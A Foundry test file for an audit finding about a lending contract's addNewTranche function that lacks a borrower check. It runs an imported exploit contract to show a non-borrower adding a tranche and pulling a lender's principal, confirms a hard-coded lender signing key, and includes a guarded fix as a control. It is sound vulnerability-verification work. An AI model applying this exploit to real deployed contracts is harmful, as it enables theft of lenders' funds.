// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    MultiSourceLoan,
    PrincipalToken,
    Terms
} from "./35214-h-12-addnewtranche-no-authorization-from-borrower-code4rena.sol";

/// Fix: only the borrower may add a tranche.
contract GuardedLoan {
    address public borrower;
    bool public seeded;

    function seed(address _borrower) external {
        require(!seeded, "seeded");
        borrower = _borrower;
        seeded = true;
    }

    function addNewTranche(MultiSourceLoan.RenegotiationOffer calldata, MultiSourceLoan.Loan calldata, bytes calldata)
        external
        view
    {
        require(seeded, "seed");
        require(msg.sender == borrower, "caller");
    }
}

contract Finding35214Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 constant LENDER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    address constant LENDER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address constant TOKEN = 0x8ea53755A6CB335DD77e8DfBE91078CF210015C7;
    address constant LOAN = 0x671D353A77015fA0B747f24eb2a50b0E3340BD1d;

    function _deploy() internal returns (Exploit e) {
        vm.chainId(1);
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        e = new Exploit();
    }

    function test_embedded_signature_is_the_lender_key() public {
        Exploit e = _deploy();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.token()), TOKEN, "token");
        assertEq(address(e.loan()), LOAN, "loan");
        bytes32 digest = e.loan().digest(e.loan().previewOffer());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_PK, digest);
        assertEq(abi.encodePacked(r, s, v), e.lenderSignature(), "sig");
        assertEq(vm.addr(LENDER_PK), LENDER, "lender");
    }

    function test_tranche_added_without_the_borrower() public {
        Exploit e = _deploy();
        vm.prank(ATTACKER);
        e.run();

        assertEq(e.token().balanceOf(Terms.PROTOCOL), Terms.PRINCIPAL, "pulled");
        assertEq(e.token().balanceOf(Terms.BORROWER), 0, "borrower");
        assertEq(e.token().balanceOf(Terms.LENDER), 0, "lender");
        assertEq(e.loan().escrowedTokenId(), Terms.TOKEN_ID, "nft");
        assertEq(e.loan().pulledFromLender(), Terms.PRINCIPAL, "cut");
        assertEq(e.loan().paidToBorrower(), 0, "paid");
        assertTrue(ATTACKER != Terms.BORROWER, "caller");
    }

    function test_control_borrower_check_reverts() public {
        GuardedLoan guarded = new GuardedLoan();
        guarded.seed(Terms.BORROWER);
        MultiSourceLoan.RenegotiationOffer memory offer;
        MultiSourceLoan.Loan memory loan;
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("caller"));
        guarded.addNewTranche(offer, loan, "");
        assertEq(guarded.borrower(), Terms.BORROWER, "borrower");
    }
}
